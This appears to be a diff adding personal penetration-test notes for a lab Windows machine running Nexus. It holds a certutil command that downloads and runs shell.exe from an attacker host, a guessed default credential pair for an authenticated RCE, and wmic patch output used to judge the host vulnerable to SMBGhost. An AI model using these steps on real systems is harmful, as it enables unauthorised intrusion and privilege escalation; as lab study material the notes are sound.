@@ -1,0 +1,29 @@
+# CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.49.190/shell.exe shell.exe'
+CMD='cmd.exe /c shell.exe'
+
+initial foothold:
+
+guess username password -> nexus:nexus (THINK SIMPLY)
+
+use auth rce with the following lines^ 
+
+
+
+privesc 
+
+Installed Patches Enumeration
+
+Listing the installed KBs, we learn that the most recently installed patch is KB4540673. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.
+
+C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list
+wmic qfe list
+Caption                                     CSName     Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
+http://support.microsoft.com/?kbid=4552931  BILLYBOSS  Update                        KB4552931               NT AUTHORITY\SYSTEM  5/26/2020
+http://support.microsoft.com/?kbid=4497165  BILLYBOSS  Update                        KB4497165               NT AUTHORITY\SYSTEM  5/26/2020
+http://support.microsoft.com/?kbid=4497727  BILLYBOSS  Security Update               KB4497727                                    4/1/2019 
+http://support.microsoft.com/?kbid=4537759  BILLYBOSS  Security Update               KB4537759               NT AUTHORITY\SYSTEM  5/26/2020
+http://support.microsoft.com/?kbid=4552152  BILLYBOSS  Security Update               KB4552152               NT AUTHORITY\SYSTEM  5/26/2020
+http://support.microsoft.com/?kbid=4540673  BILLYBOSS  Update                        KB4540673               BILLYBOSS\nathan     5/27/2020
+
+need to download and compile exploit with reverse shell, lazy, used msfconsole
+
